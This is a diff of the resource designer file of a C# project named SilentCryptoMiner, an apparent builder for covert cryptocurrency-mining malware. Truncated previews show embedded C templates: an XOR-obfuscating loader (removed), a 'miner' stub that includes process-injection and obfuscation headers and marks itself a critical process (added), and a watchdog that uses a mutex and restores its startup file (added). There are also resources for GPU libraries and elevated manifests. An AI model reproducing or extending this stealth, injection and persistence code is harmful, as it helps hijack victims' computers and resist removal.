@@ -75,15 +75,15 @@ namespace SilentCryptoMiner.Properties {
         ///using Microsoft.Win32;
         ///using System.Collections.Generic;
         ///using System.Management;
-        ///#if DefDebug
-        ///using System.Windows.Forms;
-        ///#endif
+        ///using System.Linq;
         ///
-        ///public partial class _rChecker_
+        ///public partial class Checker
         ///{
         ///    private static void Main()
         ///    {
-        ///    [rest of string was truncated]&quot;;.
+        ///        try
+        ///        {
+        ///            i [rest of string was truncated]&quot;;.
         /// </summary>
         public static string Checker {
             get {
@@ -104,9 +104,9 @@ namespace SilentCryptoMiner.Properties {
         /// <summary>
         ///   Looks up a localized resource of type System.Byte[].
         /// </summary>
-        public static byte[] DllLoader {
+        public static byte[] ddb64 {
             get {
-                object obj = ResourceManager.GetObject("DllLoader", resourceCulture);
+                object obj = ResourceManager.GetObject("ddb64", resourceCulture);
                 return ((byte[])(obj));
             }
         }
@@ -142,6 +142,16 @@ namespace SilentCryptoMiner.Properties {
         }
         
         /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        public static byte[] Files {
+            get {
+                object obj = ResourceManager.GetObject("Files", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
         ///   Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
         /// </summary>
         public static System.Drawing.Icon icon {
@@ -162,74 +172,23 @@ namespace SilentCryptoMiner.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized resource of type System.Byte[].
-        /// </summary>
-        public static byte[] Includes {
-            get {
-                object obj = ResourceManager.GetObject("Includes", resourceCulture);
-                return ((byte[])(obj));
-            }
-        }
-        
-        /// <summary>
-        ///   Looks up a localized resource of type System.Byte[].
-        /// </summary>
-        public static byte[] libs {
-            get {
-                object obj = ResourceManager.GetObject("libs", resourceCulture);
-                return ((byte[])(obj));
-            }
-        }
-        
-        /// <summary>
-        ///   Looks up a localized string similar to #include &lt;stdio.h&gt;
-        ///#include &lt;stdlib.h&gt;
-        ///#include &lt;windows.h&gt;
-        ///#include &lt;sys/types.h&gt;
-        ///#include &quot;Includes/syscalls.h&quot;
-        ///
-        ////* Created by Unam Sanctam, https://github.com/UnamSanctam */
-        ///
-        ///char* cipher(char* data, long dataLen) {
-        ///	char* output = (char*)malloc(sizeof(char) * dataLen+1);
-        ///	output[dataLen] = 0;
-        ///	for (int i = 0; i &lt; dataLen; i++) {
-        ///		output[i] = data[i] ^ &quot;#KEY&quot;[i % #KEYLENGTH];
-        ///	}
-        ///	return output;
-        ///}
-        ///
-        ///int main(int argc, char** argv) {
-        ///	Sleep(startDelay * 1000);
-        ///	
-        ///	PROCESS_INFORMATION p_info;
-        ///	STARTUPINFO s_ [rest of string was truncated]&quot;;.
-        /// </summary>
-        public static string Loader {
-            get {
-                return ResourceManager.GetString("Loader", resourceCulture);
-            }
-        }
-        
-        /// <summary>
         ///   Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
         ///&lt;Localization&gt;
         ///  &lt;Control Name=&quot;tabMain&quot;&gt;
         ///    &lt;Text Lang=&quot;en&quot;&gt;Main&lt;/Text&gt;
         ///    &lt;Text Lang=&quot;sv&quot;&gt;Main&lt;/Text&gt;
         ///    &lt;Text Lang=&quot;pl&quot;&gt;Główne&lt;/Text&gt;
+        ///    &lt;Text Lang=&quot;es&quot;&gt;Principal&lt;/Text&gt;
         ///  &lt;/Control&gt;
         ///  &lt;Control Name=&quot;tabStartup&quot;&gt;
         ///    &lt;Text Lang=&quot;en&quot;&gt;Startup&lt;/Text&gt;
         ///    &lt;Text Lang=&quot;sv&quot;&gt;Uppstart&lt;/Text&gt;
         ///    &lt;Text Lang=&quot;pl&quot;&gt;Start&lt;/Text&gt;
+        ///    &lt;Text Lang=&quot;es&quot;&gt;Inicio&lt;/Text&gt;
         ///  &lt;/Control&gt;
         ///  &lt;Control Name=&quot;tabAssembly&quot;&gt;
         ///    &lt;Text Lang=&quot;en&quot;&gt;Assembly&lt;/Text&gt;
-        ///    &lt;Text Lang=&quot;sv&quot;&gt;Assembly&lt;/Text&gt;
-        ///    &lt;Text Lang=&quot;pl&quot;&gt;Assembly&lt;/Text&gt;
-        ///  &lt;/Control&gt;
-        ///  &lt;Control Name=&quot;tabI [rest of string was truncated]&quot;;.
+        ///    &lt;Text Lang=&quot;sv&quot;&gt;Assembly&lt;/Text&gt; [rest of string was truncated]&quot;;.
         /// </summary>
         public static string LocalizedControls {
             get {
@@ -244,6 +203,34 @@ namespace SilentCryptoMiner.Properties {
             get {
                 object obj = ResourceManager.GetObject("microsoft_admin", resourceCulture);
                 return ((System.Drawing.Bitmap)(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to #include &quot;UFiles\ntddk.h&quot;
+        ///#include &lt;string&gt;
+        ///#include &lt;shlobj.h&gt;
+        ///
+        ///#include &quot;UFiles\utils.h&quot;
+        ///#include &quot;UFiles\common.h&quot;
+        ///#include &quot;UFiles\obfuscate.h&quot;
+        ///#include &quot;UFiles\obfuscatew.h&quot;
+        ///#include &quot;UFiles\kernel32_undoc.h&quot;
+        ///#include &quot;UFiles\Injection\inject.h&quot;
+        ///$RESOURCES
+        ///
+        ///BOOLEAN bl;
+        ///
+        ///void set_critical_process(HANDLE pHandle) {
+        ///#if DefProcessProtect
+        ///    if (pHandle &gt; 0 &amp;&amp; (bl || NT_SUCCESS(UpRtlAdjustPrivilege(20, TRUE, FALSE, &amp;bl))))
+        ///    {
+        ///        ULONG breakStatus = true;
+        ///        UtSetInformation [rest of string was truncated]&quot;;.
+        /// </summary>
+        public static string miner {
+            get {
+                return ResourceManager.GetString("miner", resourceCulture);
             }
         }
         
@@ -270,9 +257,9 @@ namespace SilentCryptoMiner.Properties {
         /// <summary>
         ///   Looks up a localized resource of type System.Byte[].
         /// </summary>
-        public static byte[] ProcessInject {
+        public static byte[] nvrtc_builtins64_112 {
             get {
-                object obj = ResourceManager.GetObject("ProcessInject", resourceCulture);
+                object obj = ResourceManager.GetObject("nvrtc_builtins64_112", resourceCulture);
                 return ((byte[])(obj));
             }
         }
@@ -280,46 +267,18 @@ namespace SilentCryptoMiner.Properties {
         /// <summary>
         ///   Looks up a localized resource of type System.Byte[].
         /// </summary>
-        public static byte[] ProcessProtect {
+        public static byte[] nvrtc64_112_0 {
             get {
-                object obj = ResourceManager.GetObject("ProcessProtect", resourceCulture);
+                object obj = ResourceManager.GetObject("nvrtc64_112_0", resourceCulture);
                 return ((byte[])(obj));
             }
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to using System;
-        ///using System.Diagnostics;
-        ///using System.IO;
-        ///using System.IO.Compression;
-        ///using System.Management;
-        ///using System.Reflection;
-        ///using System.Runtime.InteropServices;
-        ///using System.Security.Cryptography;
-        ///using System.Security.Principal;
-        ///using System.Text;
-        ///using System.Threading;
-        ///using System.Collections.Generic;
-        ///#if DefDebug
-        ///using System.Windows.Forms;
-        ///#endif
-        ///
-        ///#if DefAssembly
-        ///[assembly: AssemblyTitle(&quot;%Title%&quot;)]
-        ///[assembly: AssemblyDescription(&quot;%Description%&quot;)]
-        ///[assembly: AssemblyCom [rest of string was truncated]&quot;;.
-        /// </summary>
-        public static string Program {
-            get {
-                return ResourceManager.GetString("Program", resourceCulture);
-            }
-        }
-        
-        /// <summary>
         ///   Looks up a localized string similar to #ifdef DefIcon
-        ///MAINICON ICON &quot;#ICON&quot;
+        ///1 ICON &quot;#ICON&quot;
         ///#endif
-        ///1 24 &quot;loader.manifest&quot;
+        ///1 24 &quot;program.manifest&quot;
         ///#ifdef DefAssembly
         ///1 VERSIONINFO
         ///FILEVERSION     #VERSION
@@ -327,7 +286,7 @@ namespace SilentCryptoMiner.Properties {
         ///BEGIN
         ///    BLOCK &quot;StringFileInfo&quot;
         ///    BEGIN
-        ///        BLOCK &quot;040904b0&quot;
+        ///        BLOCK &quot;040904E4&quot;
         ///        BEGIN
         ///            VALUE &quot;CompanyName&quot;, &quot;#COMPANY&quot;
         ///			VALUE &quot;FileTitle&quot;, &quot;#TITLE&quot;
@@ -335,7 +294,7 @@ namespace SilentCryptoMiner.Properties {
         ///            VALUE &quot;FileVersion&quot;, &quot;#VERSION&quot;
         ///            VALUE &quot;LegalCopyright&quot;, &quot;#COPYRIGHT&quot;
         ///			VALUE &quot;LegalTrademark&quot;, &quot;#TRADEMARK&quot;
-        ///  [rest of string was truncated]&quot;;.
+        ///        [rest of string was truncated]&quot;;.
         /// </summary>
         public static string resource {
             get {
@@ -364,16 +323,19 @@ namespace SilentCryptoMiner.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-        ///&lt;assembly manifestVersion=&quot;1.0&quot; xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot;&gt;
-        ///	&lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v2&quot;&gt;
-        ///		&lt;security&gt;
-        ///			&lt;requestedPrivileges xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt;
-        ///                &lt;requestedExecutionLevel level=&quot;#MANIFESTLEVEL&quot; uiAccess=&quot;false&quot; /&gt;
-        ///            &lt;/requestedPrivileges&gt;
-        ///        &lt;/security&gt;
-        ///    &lt;/trustInfo&gt;
-        ///&lt;/assembly&gt;  .
+        ///   Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;
+        ///&lt;assembly xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot; manifestVersion=&quot;1.0&quot;&gt;
+        ///  &lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt;
+        ///    &lt;security&gt;
+        ///      &lt;requestedPrivileges&gt;
+        ///        &lt;requestedExecutionLevel level=&quot;#MANIFESTLEVEL&quot;/&gt;
+        ///      &lt;/requestedPrivileges&gt;
+        ///    &lt;/security&gt;
+        ///  &lt;/trustInfo&gt;
+        ///  &lt;compatibility xmlns=&quot;urn:schemas-microsoft-com:compatibility.v1&quot;&gt;
+        ///    &lt;application&gt;
+        ///      &lt;!--The ID below indicates application support for Windows Vista --&gt;
+        ///     [rest of string was truncated]&quot;;.
         /// </summary>
         public static string template {
             get {
@@ -396,13 +358,11 @@ namespace SilentCryptoMiner.Properties {
         ///using Microsoft.Win32;
         ///using System.Collections.Generic;
         ///using System.Management;
-        ///#if DefDebug
-        ///using System.Windows.Forms;
-        ///#endif
+        ///using System.Linq;
         ///
         ///public partial class _rUninstaller_
         ///{
-        ///    private static string _rbD_ = Path [rest of string was truncated]&quot;;.
+        ///    private static string libsPath = Path.Combine(Environment.GetFold [rest of string was truncated]&quot;;.
         /// </summary>
         public static string Uninstaller {
             get {
@@ -411,28 +371,29 @@ namespace SilentCryptoMiner.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to using System;
-        ///using System.Diagnostics;
-        ///using System.IO;
-        ///using System.Management;
-        ///using System.Reflection;
-        ///using System.Security.Principal;
-        ///using System.Security.Cryptography;
-        ///using System.Runtime.InteropServices;
-        ///using System.Text;
-        ///using System.Threading;
-        ///#if DefDebug
-        ///using System.Windows.Forms;
-        ///#endif
+        ///   Looks up a localized string similar to #include &quot;UFiles\ntddk.h&quot;
+        ///#include &lt;shlobj.h&gt;
         ///
-        ///[assembly: AssemblyTitle(&quot;Shell Infrastructure Host&quot;)]
-        ///[assembly: AssemblyDescription(&quot;Shell Infrastructure Host&quot;)]
-        ///[assembly: AssemblyProduct(&quot;Microsoft® Windows® Operating System&quot;)]
-        ///[asse [rest of string was truncated]&quot;;.
+        ///#include &quot;UFiles\utils.h&quot;
+        ///#include &quot;UFiles\common.h&quot;
+        ///#include &quot;UFiles\obfuscatew.h&quot;
+        ///#include &quot;UFiles\kernel32_undoc.h&quot;
+        ///
+        ///int wmain(int argc, wchar_t* argv[])
+        ///{
+        ///    HANDLE hMutex = CreateMutexW(NULL, TRUE, AYW_OBFUSCATE(L&quot;Global\\#WATCHDOGID&quot;));
+        ///
+        ///    load_kernel32_functions();
+        ///
+        ///    wchar_t startupPath[MAX_PATH] = { 0 };
+        ///    SHGetFolderPathW(NULL, $BASEDIR, NULL, 0, startupPath);
+        ///    wcscat(startupPath, AYW_OBFUSCATE(L&quot;#STARTUPFILE&quot;));
+        ///
+        ///    bool  [rest of string was truncated]&quot;;.
         /// </summary>
-        public static string Watchdog {
+        public static string watchdog {
             get {
-                return ResourceManager.GetString("Watchdog", resourceCulture);
+                return ResourceManager.GetString("watchdog", resourceCulture);
             }
         }
         
